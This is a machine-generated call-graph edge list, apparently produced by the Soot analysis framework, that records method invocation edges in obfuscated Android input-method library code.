VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
INTERFACE edge: $r5 = interfaceinvoke $r1.<ldp: java.lang.Object a(java.lang.Object)>($r4) in <hcb: java.lang.Object l(java.lang.String,ldp)> ==> <hbw: java.lang.Object a(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void a(long,int)>(1L, $i1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: void a(long,int)>
VIRTUAL edge: r0 = virtualinvoke r0.<lqd: lqd d(ldp)>($r1) in <lqd: lqd c()> ==> <lqd: lqd d(ldp)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>("%s:%s", $r2) in <hnc: java.lang.String k(java.lang.String,java.lang.String)> ==> <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])>
INTERFACE edge: interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r1, $r5) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsq: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r0) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: boolean hasNext()>
VIRTUAL edge: $r1 = virtualinvoke $r3.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lak: void <init>(byte[])> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r4.<nzh: boolean f(ivv)>(r0) in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean f(ivv)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <ltr: lsz c(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <izw: lsa w(java.lang.Object)>($r2) in <lrg: lsa l()> ==> <izw: lsa w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean F(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean F(java.lang.String)>
STATIC edge: $r0 = staticinvoke <java.util.Collections: java.util.List emptyList()>() in <lvt: void <clinit>()> ==> <java.util.Collections: java.util.List emptyList()>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)>($r2, $r1, $z0) in <lsh: lse h(java.util.logging.Level)> ==> <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r4, null) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
SPECIAL edge: specialinvoke $r4.<java.lang.IndexOutOfBoundsException: void <init>()>() in <lsm: lsz c(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke r0.<ljd: int e()>() in <ljd: int f(java.lang.Object)> ==> <ljd: int e()>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i1, 2) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
STATIC edge: $r29 = staticinvoke <android.util.Base64: byte[] decode(java.lang.String,int)>($r12, 3) in <hbw: java.lang.Object a(java.lang.Object)> ==> <android.util.Base64: byte[] decode(java.lang.String,int)>
STATIC edge: $r2 = staticinvoke <lum: lto d(java.lang.String)>($r0) in <lsh: lsh j(java.lang.String)> ==> <lum: lto d(java.lang.String)>
STATIC edge: $r9 = staticinvoke <java.security.SecureRandom: byte[] getSeed(int)>(8) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.security.SecureRandom: byte[] getSeed(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $i0 = staticinvoke <kwe: int U(int,int,int)>($i0, 1, 1073741823) in <ljd: void q(int)> ==> <kwe: int U(int,int,int)>
VIRTUAL edge: $l3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: long l()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: long l()>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: int b()> ==> <ljd: boolean v()>
SPECIAL edge: specialinvoke $r0.<ljd: void <init>()>() in <ljd: ljd g()> ==> <ljd: void <init>()>
STATIC edge: $z0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r5, $i2, $r4) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
STATIC edge: $r2 = staticinvoke <hnc: java.lang.String k(java.lang.String,java.lang.String)>($r2, $r3) in <hnc: java.lang.String d(hmm)> ==> <hnc: java.lang.String k(java.lang.String,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean isEmpty()>() in <ljd: int c()> ==> <ljd: boolean isEmpty()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $r1 = virtualinvoke $r7.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r0.<java.util.Map: java.lang.Object get(java.lang.Object)>($r2) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>($r2) in <miv: void <clinit>()> ==> <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: java.lang.Object[] n()>
INTERFACE edge: $r9 = interfaceinvoke $r7.<java.util.Map$Entry: java.lang.Object getKey()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r8.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <lvr: void <init>(java.util.List)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $r12 = virtualinvoke $r2.<ivv: ivw a()>() in <ivw: ivw d(java.util.Locale)> ==> <ivv: ivw a()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <liz: void <init>(ljd)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <ivw: ivw g(java.lang.String)>($r0) in <ivw: ivw f(java.lang.String)> ==> <ivw: ivw g(java.lang.String)>
SPECIAL edge: specialinvoke $r10.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_CATEGORY_METADATA", 10, 10) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c0) in <ivw: boolean u(char)> ==> <ivw: boolean O(char)>
VIRTUAL edge: $r5 = virtualinvoke r0.<lli: java.util.Collection b()>() in <lli: void e(java.lang.Object,java.lang.Object)> ==> <lmb: java.util.Collection b()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r4.<hbv: boolean m(java.lang.Object)>($r1) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <hbv: boolean m(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hny: void <init>(ivw,java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r3.<java.lang.String: int indexOf(int)>(95) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: int indexOf(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("must be power of 2 between 2^1 and 2^30: ") in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int size()>() in <ljf: boolean isEmpty()> ==> <ljf: int size()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liy: java.util.Iterator iterator()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Object: java.lang.Object clone()>() in <lkg: void g(int)> ==> <java.lang.Object: java.lang.Object clone()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getKey()>
INTERFACE edge: $i0 = interfaceinvoke $r1.<java.util.Set: int size()>() in <ljf: int size()> ==> <java.util.HashSet: int size()>
SPECIAL edge: specialinvoke $r0.<ivv: void <init>(byte[])>(null) in <ivw: ivv I()> ==> <ivv: void <init>(byte[])>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
STATIC edge: $r1 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag") in <ivw: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lts l()>() in <lsd: boolean b(lsr)> ==> <lsn: lts l()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lin: void <init>(ldp,lqd)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <hcb: void <init>()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <lvs: void <init>(java.lang.String,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": ") in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.IndexOutOfBoundsException: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lsm: int a(lsz)>($r1) in <lsm: java.lang.Object d(lsz)> ==> <lsm: int a(lsz)>
SPECIAL edge: specialinvoke $r5.<java.text.SimpleDateFormat: void <init>(java.lang.String)>("yyyy-MM-dd\'T\'HH:mm:ss.SSSZ") in <lsc: void f(java.lang.String,ltn)> ==> <java.text.SimpleDateFormat: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(19) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r11.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r4.<java.util.Iterator: java.lang.Object next()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": logging error [") in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $i0 = staticinvoke <izw: int ac(int)>($i0) in <izw: int ad(java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.lang.Object e(int)>($i0) in <ljf: java.util.Set f()> ==> <ljf: java.lang.Object e(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <qj: int b(java.lang.Object)> ==> <ivw: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String substring(int)>(1) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.String substring(int)>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <ljb: java.lang.Object getValue()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c0) in <ivw: boolean y(char)> ==> <ivw: boolean u(char)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <qj: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
STATIC edge: $r0 = staticinvoke <lmo: lqs G(java.util.Comparator)>($r1) in <lme: lma l(java.util.Comparator)> ==> <lmo: lqs G(java.util.Comparator)>
VIRTUAL edge: virtualinvoke $r3.<lmb: void g(java.lang.Object,java.lang.Object)>($r5, $r11) in <hbv: void j()> ==> <lmb: void g(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $r3 = staticinvoke <lri: java.util.ArrayList P(java.util.Iterator)>($r2) in <izw: java.util.Collection at(java.lang.Iterable)> ==> <lri: java.util.ArrayList P(java.util.Iterator)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "Expected size must be >= 0") in <ljd: void q(int)> ==> <iye: void y(boolean,java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqo: void <init>(lkx,lkq)>(r0, $r1) in <lqq: lma g()> ==> <lqo: void <init>(lkx,lkq)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Enum: int hashCode()>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lji: void <init>(java.util.Comparator)> ==> <lqd: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <llg: void <init>(llo)> ==> <lsa: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r0, $r1) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lqp: void <init>(java.lang.Object[],int,int)>($r2, 0, $i0) in <lqq: lma g()> ==> <lqp: void <init>(java.lang.Object[],int,int)>
STATIC edge: $r3 = staticinvoke <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)>($r4, $r5, $r2) in <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)> ==> <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 253, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
STATIC edge: staticinvoke <java.util.Arrays: void fill(java.lang.Object[],int,int,java.lang.Object)>($r2, $i5, $i1, null) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.Arrays: void fill(java.lang.Object[],int,int,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Duplicated extension singleton: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <lkq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkq: void <clinit>()>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String replace(char,char)>(47, 46) in <lsp: java.lang.String b()> ==> <java.lang.String: java.lang.String replace(char,char)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r12 = virtualinvoke $r11.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>($r1, $r5) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object putIfAbsent(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lrg: void <init>(java.lang.Object)>($r0) in <lma: lma r(java.lang.Object)> ==> <lrg: void <init>(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)>($r2, $l1, $r0) in <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)> ==> <j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)>
SPECIAL edge: specialinvoke $r9.<lta: void <init>(lsr,java.lang.Object)>($r3, $r7) in <lsn: boolean ac()> ==> <lta: void <init>(lsr,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <iwt: boolean k(char)>($c0) in <ivw: boolean O(char)> ==> <iwt: boolean k(char)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(4) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean s(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/future/FluentFuture") in <her: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Incomplete extension subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqo: void <init>(lkx,lkq)> ==> <lma: void <init>()>
VIRTUAL edge: $i4 = virtualinvoke $r0.<java.lang.String: int length()>() in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean add(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <java.util.HashSet: boolean add(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean x(char)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <dwx: void <init>(int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<mij: void <init>(miy)>($r1) in <her: void <init>(miy)> ==> <mij: void <init>(miy)>
STATIC edge: $r3 = staticinvoke <lkq: lkq q()>() in <lmo: lqs G(java.util.Comparator)> ==> <lkq: lkq q()>
SPECIAL edge: specialinvoke r0.<java.io.InputStream: void <init>()>() in <bek: void <init>(java.nio.ByteBuffer)> ==> <java.io.InputStream: void <init>()>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lin: void <init>(ldp,lqd)> ==> <lqd: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljf: void h()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: void h()>
SPECIAL edge: specialinvoke $r0.<lpi: void <init>(java.lang.String,int)>("KEY", 0) in <lpi: void <clinit>()> ==> <lpi: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void g(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void g(java.lang.String)>
STATIC edge: staticinvoke <lri: void t(java.lang.Object,int)>($r3, $i3) in <lma: lma i(int,java.lang.Object[])> ==> <lri: void t(java.lang.Object,int)>
INTERFACE edge: $r5 = interfaceinvoke $r1.<java.util.Map: java.lang.Object get(java.lang.Object)>($r4) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljf: void l(int)>($i6) in <ljf: boolean add(java.lang.Object)> ==> <ljf: void l(int)>
SPECIAL edge: $i5 = specialinvoke r0.<ljf: int o(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljf: boolean add(java.lang.Object)> ==> <ljf: int o(int,int,int,int)>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r7, $i5) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r5.<java.util.ConcurrentModificationException: void <init>()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.ConcurrentModificationException: void <init>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lid: void <init>()>() in <ljb: void <init>(ljd,int)> ==> <lid: void <init>()>
CLINIT edge: staticinvoke <luk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <luk: void <clinit>()>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hns: void <init>()> ==> <iec: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Long: java.lang.Long valueOf(long)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: $r11 = specialinvoke r0.<ivv: ivw i(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <ivv: ivw i(java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(13) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r5 = virtualinvoke $r19.<java.lang.ThreadLocal: java.lang.Object get()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.ThreadLocal: java.lang.Object get()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r9 = virtualinvoke $r6.<lly: lma g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lly: lma g()>
